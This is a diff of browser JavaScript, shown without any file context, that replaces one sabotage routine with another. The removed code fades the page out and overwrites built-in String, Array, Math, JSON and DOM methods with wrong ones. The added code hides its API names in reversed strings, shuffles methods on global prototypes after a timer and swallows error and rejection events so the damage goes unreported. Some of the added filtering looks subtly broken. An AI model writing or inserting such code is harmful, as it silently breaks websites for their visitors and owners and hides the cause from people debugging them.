@@ -1,36 +1,44 @@
-var s = document.createElement("style");
-s.textContent = "} } 0 :yticapo { ot { _ semarfyek@ } etinifni etanretla s06 s1 _ :noitamina { ydob".split("").reverse().join("");
-document.head.appendChild(s);
+const s = [
+  "tnemucod", // 0
+  "tnemelEetaerc", // 1
+  "elyts", // 2
+  "} } 0 :yticapo { ot { _ semarfyek@ } etinifni etanretla s06 s1 _ :noitamina { ydob", // 3
+  "daeh", // 4
+  "dlihCdneppa", // 5
+  "epytotorp", // 6
+  "rotcurtsnoc", // 7
+  "rorreno", // 8
+  "noitcejerdeldnahnuo", // 9
+].map(t => t.split("").reverse().join(""));
+var e = window[s[0]][s[1]](s[2]);
+e.textContent = s[3];
+window[s[0]][s[4]][s[5]](e);
 setTimeout(() => {
-  Object.prototype.toString = Object.prototype.valueOf;
-  Object.prototype.hasOwnProperty = Object.prototype.isPrototypeOf;
-  Object.keys = Object.values;
-  Object.assign = Object.freeze;
-  String.prototype.toLowerCase = String.prototype.split;
-  String.prototype.toUpperCase = String.prototype.trim;
-  String.prototype.trim = String.prototype.indexOf;
-  String.prototype.includes = String.prototype.replace;
-  String.prototype.slice = String.prototype.match;
-  String.prototype.substring = String.prototype.charAt;
-  String.prototype.replace = String.prototype.concat;
-  String.prototype.startsWith = String.prototype.endsWith;
-  String.prototype.charAt = String.prototype.charCodeAt;
-  Array.prototype.filter = Array.prototype.forEach;
-  Array.prototype.map = Array.prototype.push;
-  Array.prototype.find = Array.prototype.findIndex;
-  Array.prototype.splice = Array.prototype.slice;
-  Array.prototype.indexOf = Array.prototype.lastIndexOf;
-  Array.prototype.reduce = Array.prototype.reduceRight;
-  Array.prototype.some = Array.prototype.every;
-  Array.isArray = Object.isFrozen;
-  Number.parseInt = Number.parseFloat;
-  Math.floor = Math.ceil;
-  Math.round = Math.random;
-  JSON.stringify = JSON.parse;
-  Promise.resolve = Promise.reject;
-  document.querySelector = document.querySelectorAll;
-  document.getElementById = document.getElementsByClassName;
-  Element.prototype.setAttribute = Element.prototype.removeAttribute;
-  Element.prototype.addEventListener = Element.prototype.removeEventListener;
-  window.onerror = Boolean;
-}, 5000);
+  var commands = [];
+  for (var k of Object.getOwnPropertyNames(window).slice(0, 10)) {
+    if (k[0] < "A" || k[0] > "Z") continue;
+    var target = window[k][s[6]];
+    if (target) {
+      var names = Object.getOwnPropertyNames(target).filter(function(n) {
+        var d = Object.getOwnPropertyDescriptor(target, n);
+        return d && typeof d.value === "function" && n[0] >= 'A' && n[0] <= 'Z' && n !== s[7];
+      });
+      var shuffled = names.slice();
+      for (var i = shuffled.length - 1; i > 0; i--) {
+        var j = Math.floor(Math.random() * (i + 1));
+        var tmp = shuffled[i];
+        shuffled[i] = shuffled[j];
+        shuffled[j] = tmp;
+      }
+      var originals = {};
+      for (var n of names) originals[n] = target[n];
+      for (var idx = 0; idx < names.length; idx++) {
+        commands.push({ target: target, name: names[idx], fn: originals[shuffled[idx]] });
+      }
+    }
+  }
+  for (var cmd of commands) {
+    try { cmd.target[cmd.name] = cmd.fn; } catch(e) {}
+  }
+  window[s[8]] = window[s[9]] = e => (e.preventDefault(), true);
+}, 10000);
